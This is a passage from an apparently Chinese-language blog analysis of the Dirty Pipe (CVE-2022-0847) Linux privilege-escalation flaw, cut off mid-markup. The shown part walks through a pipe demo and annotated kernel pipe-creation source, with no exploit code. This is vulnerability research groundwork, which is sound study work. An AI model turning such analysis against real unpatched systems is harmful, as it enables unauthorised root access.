v5.11.1内核代码，也尝试对比了下linux0.12内核的源代码，发现内部的结构体与代码逻辑已完全不同，0.12使用了名叫<code>m_inode</code>的结构体，而5.11.1则使用了<code>pipe_inode_info</code>的结构体，光pipe.c文件的体量，linux0.12为128行，而5.11.1为1431行，差了11倍的代码量，综合多方面考虑，linux0.12的代码对于现在linux内核运作的理解并不具备太大的参考价值。</p><p>代码有一部分的变量值是我通过poc实时得出的，并不适用于所有情况。</p><p>下面的代码分析章节编写顺序是按照调用关系来写的（比如函数A调用了函数B，编写时先写A再写B），然而分析顺序与编写顺序恰好相反（也就是先分析B再分析A），原因是在源码分析时，很明显要线分析最内层的函数，这样才能更好理解外层函数的作用，所以有些代码分析大家可能不能理解，往下看就好了。</p><p>笔者先将整体的流程图贴出来，方便师傅们对函数调用流程有个整体的把握。</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220322160826347.png" alt="image-20220322160826347"></p><p>创建pipe的流程首先创建两个整数类型的文件描述符</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><p>之后利用pipe函数传入文件描述符即可打开管道，其中fd[0]为读管道的文件描述符，fd[1]为写管道的文件描述符。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> err = <span class="built_in">pipe</span>(fd); </span><br></pre></td></tr></table></figure><p>一个简单的demo如下，代码主要的逻辑是：首先创建一个管道，之后通过<code>write</code>函数操作<code>fd[1]</code>向管道写入了数据，之后通过<code>read</code>函数操作<code>fd[0]</code>从管道读出数据到标准输出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd[<span class="number">2</span>];<span class="comment">//定义管道的读、写端文件描述符</span></span><br><span class="line">        <span class="keyword">int</span> len, err;</span><br><span class="line">        <span class="keyword">char</span>* str = <span class="string">&quot;hello pipe\n&quot;</span>;<span class="comment">//指定写数据</span></span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">1024</span>];<span class="comment">//定义接收缓冲区</span></span><br><span class="line"></span><br><span class="line">        err = pipe(fd);<span class="comment">//调用pipe()函数就已将管道打开</span></span><br><span class="line">        <span class="keyword">if</span>(err == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;pipe error&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)<span class="comment">/* 父进程 */</span> &#123;</span><br><span class="line">                close(fd[<span class="number">0</span>]);</span><br><span class="line">                write(fd[<span class="number">1</span>],str,<span class="built_in">strlen</span>(str));<span class="comment">//写到管道中</span></span><br><span class="line">                close(fd[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)<span class="comment">/* 子进程 */</span> &#123;</span><br><span class="line">                close(fd[<span class="number">1</span>]);</span><br><span class="line">                len = read(fd[<span class="number">0</span>],buf,<span class="keyword">sizeof</span>(buf));<span class="comment">//从管道中的读，返回读到的字节数</span></span><br><span class="line">                write(STDOUT_FILENO,buf,len);<span class="comment">//写到标准输出</span></span><br><span class="line">                close(fd[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1、pipe-与-pipe2"><a href="#1、pipe-与-pipe2" class="headerlink" title="1、pipe() 与 pipe2()"></a>1、pipe() 与 pipe2()</h4><p>创建 pipe 的系统调用有两个：<code>pipe()</code> 和 <code>pipe2()</code>，实现<a class="link"   href="https://elixir.bootlin.com/linux/v5.10/source/fs/pipe.c#L1008%EF%BC%89" >如下<i class="fas fa-external-link-alt"></i></a>，二者均调用了<code>do_pipe2</code><a class="link"   href="https://elixir.bootlin.com/linux/v5.10/source/fs/pipe.c#L986%EF%BC%89" >函数<i class="fas fa-external-link-alt"></i></a>，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SYSCALL_DEFINE2</span>(pipe2, <span class="keyword">int</span> __user *, fildes, <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">do_pipe2</span>(fildes, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SYSCALL_DEFINE1</span>(pipe, <span class="keyword">int</span> __user *, fildes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">do_pipe2</span>(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、do-pipe2"><a href="#2、do-pipe2" class="headerlink" title="2、do_pipe2"></a>2、do_pipe2</h4><p>函数通过 <code>__do_pipe_flags</code> 创建了两个 <code>fd</code> 和两个 <code>file</code>，并通过<code>fd_install</code> 将其一一绑定。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sys_pipe() is the normal C calling standard for creating</span></span><br><span class="line"><span class="comment"> * a pipe. It&#x27;s not the way Unix traditionally does this, though.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_pipe2</span><span class="params">(<span class="keyword">int</span> __user *fildes, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">files</span>[2];</span></span><br><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">error = __do_pipe_flags(fd, files, flags);<span class="comment">// 进入该函数</span></span><br><span class="line"><span class="keyword">if</span> (!error) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(<span class="built_in">copy_to_user</span>(fildes, fd, <span class="built_in"><span class="keyword">sizeof</span></span>(fd)))) &#123;</span><br><span class="line"><span class="built_in">fput</span>(files[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fput</span>(files[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">put_unused_fd</span>(fd[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">put_unused_fd</span>(fd[<span class="number">1</span>]);</span><br><span class="line">error = -EFAULT;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">fd_install</span>(fd[<span class="number">0</span>], files[<span class="number">0</span>]);<span class="comment">// fd_install ：在 fd 数组中安装一个文件指针 rcu_assign_pointer(fdt-&gt;fd[fd], file);</span></span><br><span class="line"><span class="built_in">fd_install</span>(fd[<span class="number">1</span>], files[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、-do-pipe-flags"><a href="#3、-do-pipe-flags" class="headerlink" title="3、__do_pipe_flags"></a>3、__do_pipe_flags</h4><p>查看<code>__do_pipe_flags</code>，第一个参数 <code>fd</code> 用于保存创建的两个文件描述符，第二个参数用于保存创建的两个 <code>struct file</code> 结构体实例，第三个参数是系统调用参数 <code>flags</code> 的值。</p><p>该函数被<code>do_pipe2</code>调用，创建了两个 <code>files</code> 结构，并初始化了两个文件描述符 <code>fd</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __do_pipe_flags(<span class="keyword">int</span> *fd, struct file **files, <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"><span class="keyword">int</span> fdw, fdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~(O_CLOEXEC | O_NONBLOCK | O_DIRECT | O_NOTIFICATION_PIPE))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">error = <span class="built_in">create_pipe_files</span>(files, flags);<span class="comment">// 在调试时很奇怪的直接跳转到 get_pipe_inode 函数中了</span></span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">error = <span class="built_in">get_unused_fd_flags</span>(flags);<span class="comment">// 获取读的文件描述符</span></span><br><span class="line"><span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_read_pipe;</span><br><span class="line">fdr = error;</span><br><span class="line"></span><br><span class="line">error = <span class="built_in">get_unused_fd_flags</span>(flags);<span class="comment">// 获取写的文件描述符</span></span><br><span class="line"><span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_fdr;</span><br><span class="line">fdw = error;</span><br><span class="line"></span><br><span class="line"><span class="built_in">audit_fd_pair</span>(fdr, fdw);<span class="comment">// 这里对两个文件描述符进行审计</span></span><br><span class="line">fd[<span class="number">0</span>] = fdr;</span><br><span class="line">fd[<span class="number">1</span>] = fdw;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err_fdr:</span><br><span class="line"><span class="built_in">put_unused_fd</span>(fdr);</span><br><span class="line"> err_read_pipe:</span><br><span class="line"><span class="built_in">fput</span>(files[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fput</span>(files[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、create-pipe-files"><a href="#4、create-pipe-files" class="headerlink" title="4、create_pipe_files"></a>4、create_pipe_files</h4><p>该函数被<code>__do_pipe_flags</code>调用，传入了file结构体指针类型的 <code>res</code>对象，并通过传入的 <code>flag</code>标志位生成两个 <code>file</code> 类型的对象，之后将 <code>res[0]</code> 与 <code>res[1]</code> 分别指向这两个对象。</p><p>该函数的大体逻辑为：首先通过 <code>get_pipe_inode</code> 新创建一个<code>inode</code> 对象，之后通过 <code>alloc_file_pseudo</code> 创建一个 <code>file</code> 对象，之后通过 <code>alloc_file_clone</code> 克隆刚刚生成的 <code>file</code> 对象，之后将两个<code>file</code> 对象的 <code>private_data</code> 成员设置为 <code>inode-&gt;i_pipe</code> ，而这个 <code>inode-&gt;i_pipe</code> 就是下面介绍的 <code>alloc_pipe_info</code> 生成的对象。最后调用 <code>stream_open</code> 将<code>res[0]</code> 与 <code>res[1]</code> 分别传入，打开两个文件流，具体 <code>inode</code> 在 <code>stream_open</code> 中起到的作用不清楚。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_pipe_files</span><span class="params">(struct file **res, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> <span class="built_in">get_pipe_inode</span>();<span class="comment">// 创建一个 inode 对象。</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!inode)</span><br><span class="line"><span class="keyword">return</span> -ENFILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; O_NOTIFICATION_PIPE) &#123;<span class="comment">// #define O_NOTIFICATION_PIPEO_EXCL/* Parameter to pipe2() selecting notification pipe */</span></span><br><span class="line">error = <span class="built_in">watch_queue_init</span>(inode-&gt;i_pipe);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line"><span class="built_in">free_pipe_info</span>(inode-&gt;i_pipe);</span><br><span class="line"><span class="built_in">iput</span>(inode);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">alloc_file_pseudo</span>(inode, pipe_mnt, <span class="string">&quot;&quot;</span>,</span><br><span class="line">O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),</span><br><span class="line">&amp;pipefifo_fops);<span class="comment">// 分配了struct file的堆空间，调用了 alloc_file 函数，经过多次套娃，发现最终调用的是 kmem_cache_alloc 函数。可见随着累年的发展，linux 中间接口也在不断的增加。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IS_ERR</span>(f)) &#123;<span class="comment">// 这里如果 f 分配失败则会释放之前申请的 pipe_buffer，并减少 inode 的引用计数，iput 的作用是减少 inode 的引用计数</span></span><br><span class="line"><span class="built_in">free_pipe_info</span>(inode-&gt;i_pipe);</span><br><span class="line"><span class="built_in">iput</span>(inode);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">PTR_ERR</span>(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f-&gt;private_data = inode-&gt;i_pipe;<span class="comment">// 这里将pipe_buffer 赋值给 f-&gt;private_data</span></span><br><span class="line"></span><br><span class="line">res[<span class="number">0</span>] = <span class="built_in">alloc_file_clone</span>(f, O_RDONLY | (flags &amp; O_NONBLOCK),</span><br><span class="line">  &amp;pipefifo_fops);<span class="comment">// 拷贝一份之前生成的 f 的对象</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IS_ERR</span>(res[<span class="number">0</span>])) &#123;</span><br><span class="line"><span class="built_in">put_pipe_info</span>(inode, inode-&gt;i_pipe);</span><br><span class="line"><span class="built_in">fput</span>(f);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">PTR_ERR</span>(res[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">res[<span class="number">0</span>]-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line">res[<span class="number">1</span>] = f;</span><br><span class="line"><span class="built_in">stream_open</span>(inode, res[<span class="number">0</span>]);<span class="comment">// 看了下源码，代码中没用到 inode ，不知道有什么用</span></span><br><span class="line"><span class="built_in">stream_open</span>(inode, res[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是 <code>stream_open</code> 的源码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stream_open is used by subsystems that want stream-like file descriptors.</span></span><br><span class="line"><span class="comment"> * Such file descriptors are not seekable and don&#x27;t have notion of position</span></span><br><span class="line"><span class="comment"> * (file.f_pos is always 0 and ppos passed to .read()/.write() is always NULL).</span></span><br><span class="line"><span class="comment"> * Contrary to file descriptors of other regular files, .read() and .write()</span></span><br><span class="line"><span class="comment"> * can run simultaneously.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * stream_open never fails and is marked to return int so that it could be</span></span><br><span class="line"><span class="comment"> * directly used as file_operations.open .</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stream_open</span><span class="params">(struct inode *inode, struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">filp-&gt;f_mode &amp;= ~(FMODE_LSEEK | FMODE_PREAD | FMODE_PWRITE | FMODE_ATOMIC_POS);</span><br><span class="line">filp-&gt;f_mode |= FMODE_STREAM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5、get-pipe-inode"><a href="#5、get-pipe-inode" class="headerlink" title="5、get_pipe_inode()"></a>5、get_pipe_inode()</h4><p>该函数被<code>create_pipe_files</code>调用，用于生成一个inode，且该inode只用于管道。</p><p>该函数的大体逻辑为：首先通过 <code>new_inode_pseudo</code> 新创建一个<code>inode</code> 对象，之后通过 <code>alloc_pipe_info</code> 创建一个 <code>pipe</code> 对象，之后inode-&gt;i_pipe = pipe。函数的后面初始化<code>inode</code> 对象的其他属性，并进行一系列异常处理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct inode * <span class="title">get_pipe_inode</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> <span class="built_in">new_inode_pseudo</span>(pipe_mnt-&gt;mnt_sb);<span class="comment">// 获取一个 inode 。 为给定的 superblock 分配一个新的 inode。 inode 不会被链接到 superblock s_inodes 列表中。这意味着 fs 不能卸载，quotas, fsnotify, writeback 均不能工作。 // mnt_sb 是指向 superblock 的指针。</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!inode)</span><br><span class="line"><span class="keyword">goto</span> fail_inode;</span><br><span class="line"></span><br><span class="line">inode-&gt;i_ino = <span class="built_in">get_next_ino</span>();<span class="comment">// /* ino:  Stat data, not accessed from path walking */</span></span><br><span class="line"></span><br><span class="line">pipe = <span class="built_in">alloc_pipe_info</span>();<span class="comment">// 见 8</span></span><br><span class="line"><span class="keyword">if</span> (!pipe)</span><br><span class="line"><span class="keyword">goto</span> fail_iput;</span><br><span class="line"></span><br><span class="line">inode-&gt;i_pipe = pipe;<span class="comment">// 从这到下面都是给inode进行初始化了</span></span><br><span class="line">    <span 